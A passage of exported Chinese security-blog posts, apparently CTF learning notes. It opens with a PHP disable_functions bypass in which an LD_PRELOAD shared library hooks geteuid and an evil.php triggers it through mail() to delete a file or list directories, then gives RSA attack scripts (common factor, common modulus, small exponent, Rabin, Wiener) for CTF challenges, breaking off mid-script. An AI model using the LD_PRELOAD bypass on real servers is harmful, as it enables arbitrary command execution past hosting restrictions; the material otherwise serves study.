class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">void payload() &#123;</span><br><span class=\"line\">\tsystem(&quot;rm /tmp/check.txt&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int  geteuid() &#123;</span><br><span class=\"line\">\tif (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;</span><br><span class=\"line\">\tunsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class=\"line\">\tpayload();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c -fPIC shell.c -o teset</span><br><span class=\"line\">gcc -shared teset -o test.so</span><br></pre></td></tr></table></figure>\n<p>evil.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">putenv(&quot;LD_PRELOAD=/var/www/html/preload/test.so&quot;);</span><br><span class=\"line\">\tmail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>执行evil.php ，可以发现check.txt被删除。</p>\n<p>列目录的payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;dirent.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">void payload()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DIR* dir;</span><br><span class=\"line\">    struct dirent* ptr;</span><br><span class=\"line\">    dir = opendir(&quot;/&quot;);</span><br><span class=\"line\">    FILE  *fp;</span><br><span class=\"line\">    fp=fopen(&quot;/tmp/venenoveneno&quot;,&quot;w&quot;);</span><br><span class=\"line\">    while ((ptr = readdir(dir)) != NULL) &#123;</span><br><span class=\"line\">        fprintf(fp,&quot;%s\\n&quot;,ptr-&gt;d_name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    closedir(dir);</span><br><span class=\"line\">    fflush(fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int geteuid()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123;</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class=\"line\">    payload();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"RSA学习","date":"2018-07-17T09:21:46.000Z","_content":"\n## openssl相关操作\n\n提取pubkey.pem相关信息\n\n```\n openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem\n```\n\n解密:\n\n```\nopenssl rsautl -decrypt -in 【flag.enc】 -inkey 【private.pem】\n```\n\n## 已知p,q\n\n若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的。\n\n```\ndef rsa_decrypt(e, c, p, q):\n    phi = (p - 1) * (q - 1)\n    n = p * q\n    try:\n        d = gmpy2.invert(e, phi) #求e模phi的逆\n        return pow(c, d, n)\n    except Exception as e:\n        print \"e and phi are not coprime!\"\n        raise e\n```\n\n## 查询已知的n的可分解情况\n\n在线查询：https://factordb.com/\n\napi接口：\n\n```\ncurl http://factordb.com/api?query=12345\n\nresponse:\n\n{\"id\":\"12345\",\"status\":\"FF\",\"factors\":[[\"3\",1],[\"5\",1],[\"823\",1]]}\n\n```\n\n## 使用yafu分解N\n\n适用情况：p,q相差较大或较小时可快速分解。\n\n使用方法：yafu-x64.exe factor(233) ，yafu-x64.exe help\n\nurl: ```https://www.cnblogs.com/pcat/p/7508205.html```\n\n## 模不互素 （gcd(N1,N2)!=1）\n\n适用情况：存在两个或更多模数 ，且gcd(N1,N2)!=1 。\n\n多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一gcd(N1,N2) ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。实现参照本文欧几里得算法 部分和RSA解密 部分。\n\n案例: 安恒2018 6月赛:\n\n该题目提供20个n和20个相对应的密文，由于e为65537，所以可以排除低指数广播攻击，通过分析，可以发现n4和n17并非互质，所以可以使用模不互素进行解密。\n\n```python\n# -*- coding:utf8\nimport gmpy2\nimport sys\nfrom libnum import gcd, n2s\nimport random\n\nn = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207\nc = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320\n\nn1 = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759\nc1 = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855\n\nn2 = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491\nc2 = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862\n\nn3 = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751\nc3 = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613\n\nn4 = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067\nc4 = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357\n\nn5 = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369\nc5 = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932\n\nn6 = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137\nc6 = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179\n\nn7 = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191\nc7 = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006\n\nn8 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941\nc8 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934\n\nn9 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491\nc9 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869\n\nn10 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019\nc10 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467\n\nn11 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299\nc11 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971\n\nn12 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551\nc12 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175\n\nn13 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987\nc13 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457\n\nn14 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837\nc14 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842\n\nn15 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451\nc15 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724\n\nn16 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499\nc16 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024\n\nn17 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973\nc17 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887\n\nn18 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603\nc18 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889\n\nn19 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659L\nc19 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346L\n\n# e = 65537\n\nnlist = [n, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]\nclist = [c, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, n19]\n\n# 寻找n-n19之间是否有互素的两个数\nfor i in range(20):\n\tfor j in range(20):\n\t\tif i == j:\n\t\t\tcontinue\n\t\telse:\n\t\t\tprint i, j, gcd(nlist[i], nlist[j])\n\np = 132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499\nq = 147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527\n# n17 = p1 * p2\nprint gmpy2.is_prime(132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499)\n\nprint gmpy2.is_prime(147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527)\n\n# m = random.randint(0x100000000000, 0xffffffffffff)b\n# \ndef rsa_decrypt(e, c, p, q):\n    phi = (p - 1) * (q - 1)\n    n = p * q\n    try:\n        d = gmpy2.invert(e, phi) #求e模phi的逆\n        return pow(c, d, n)\n    except Exception as e:\n        print \"e and phi are not coprime!\"\n        raise e\ne = 65537\nprint n2s(rsa_decrypt(e, c17, p, q))\n```\n\n##  共模攻击\n\n适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1\n\n```python\n# -*- coding: utf-8 -*-\n# by https://findneo.github.io/\n\nimport base64\nimport libnum\nimport gmpy2\n\n\ndef fix_py():\n    # decode encryption.encrypted\n    s1 = 'abdefghijklmpqrtuvwxyz'\n    s2 = 'dmenwfoxgpyhirasbktclu'\n    f1 = open('encryption.encrypted')\n    with open('encryption.py', 'w') as f2:\n        for i in f1.readlines():\n            tmp = ''\n            for j in i:\n                tmp += s2[s1.index(j)] if j in s1 else j\n            f2.write(tmp)\n# fix_py()\ndef common_modulus(n, e1, e2, c1, c2):\n    assert (libnum.gcd(e1, e2) == 1)\n    _, s1, s2 = gmpy2.gcdext(e1, e2)\n    m = pow(c1, s1, n) if s1 > 0 else pow(gmpy2.invert(c1, n), -s1, n)\n    m *= pow(c2, s2, n) if s2 > 0 else pow(gmpy2.invert(c2, n), -s2, n)\n    m %= n\n    return m\n\n\n[n2, n3] = map(lambda x: int(base64.b64decode(x).encode('hex'), 16),\n               open('n2&n3').readlines())\n[n1c1, n1c2] = map(lambda x: int(x, 16), open('n1.encrypted').readlines())\n[msg1c1, msg2c2] = map(lambda x: int(x, 16), open('ciphertext').readlines())\n# 通过共模攻击得到n1\ne1 = 0x1001\ne2 = 0x101\nn1 = common_modulus(n3, e1, e2, n1c1, n1c2)\n# n1,n2有一个共有质因数p1\n# n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。\np1 = gmpy2.gcd(n1, n2)\nassert (p1 != 1)\np2 = n1 / p1\np3 = n2 / p1\ne = 0x1001\nd1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1))\nd2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1))\nmsg1 = pow(msg1c1, d1, n1)\nmsg2 = pow(msg2c2, d2, n2)\nmsg1 = hex(msg1)[2:].decode('hex')\nmsg2 = hex(msg2)[2:].decode('hex')\nprint msg1, msg2\n# XA{RP0I_0Itrsigi s.y\n# MNCYT_55_neetnvmrap}\n# XMAN{CRYPT0_I5_50_Interestingvim rsa.py}\n```\n\n## 小明文攻击\n\n适用情况：e较小，一般为3。\n\n公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。\n\n```python\ndef small_msg(e, n, c):\n    print time.asctime(), \"Let's waiting...\"\n    for k in xrange(200000000):\n        if gmpy2.iroot(c + n * k, e)[1] == 1:\n            print time.asctime(), \"...done!\"\n            return gmpy2.iroot(c + n * k, 3)[0]\n```\n\n```python\nimport gmpy2,binascii,libnum,time\nn=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929\ne=3\nres=0\nc=int(open('extremelyhardRSA.rar/flag.enc','rb').read().encode('hex'),16)\nprint time.asctime()\nfor i in xrange(200000000):\n    if gmpy2.iroot(c+n*i,3)[1]==1:\n        res=gmpy2.iroot(c+n*i,3)[0]\n        print i,res\n        print libnum.n2s(res)\n        print time.asctime()\n        break\n```\n\n## Rabin加密中的N可被分解\n\n```\ndef rabin_decrypt(c, p, q, e=2):\n    n = p * q\n    mp = pow(c, (p + 1) / 4, p)\n    mq = pow(c, (q + 1) / 4, q)\n    yp = gmpy2.invert(p, q)\n    yq = gmpy2.invert(q, p)\n    r = (yp * p * mq + yq * q * mp) % n\n    rr = n - r\n    s = (yp * p * mq - yq * q * mp) % n\n    ss = n - s\n    return (r, rr, s, ss)\n```\n\n## Wiener's Attack(低解密指数攻击 )\n\n```python\nfrom Crypto.PublicKey import RSA\nimport ContinuedFractions, Arithmetic\n\ndef wiener_hack(e, n):\n    # firstly git clone 